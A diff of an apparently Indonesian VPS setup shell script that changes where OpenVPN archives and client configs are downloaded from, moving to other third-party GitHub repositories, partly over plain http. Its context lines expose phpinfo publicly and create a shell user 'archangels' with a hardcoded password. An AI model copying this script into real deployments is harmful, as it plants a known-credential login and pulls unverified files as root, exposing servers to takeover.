@@ -44,7 +44,7 @@ cd
 
 # openvpn
 apt-get -y install openvpn
-wget -O /etc/openvpn/openvpn_2.tar "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/openvpn.tar"
+wget -O /etc/openvpn/openvpn_2.tar "http://raw.github.com/Qeesya/autoscript/master/script/openvpn.tar"
 cd /etc/openvpn/;tar xf openvpv.tar;rm openvpn.tar
 
 # nginx
@@ -58,10 +58,12 @@ echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
 wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/vps.conf"
 sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
 # etc
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/SSL3777/9/master/client.ovpn"
+wget -O /home/vps/public_html/client.ovpn "http://raw.github.com/Qeesya/autoscript/master/script/client.ovpn"
+wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/client1.ovpn"
 wget -O /etc/motd "https://raw.githubusercontent.com/ehomecore/deb-ubun/master/rendum/motd"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
 useradd -m -g users -s /bin/bash archangels
 echo "7C22C4ED" | chpasswd
 echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
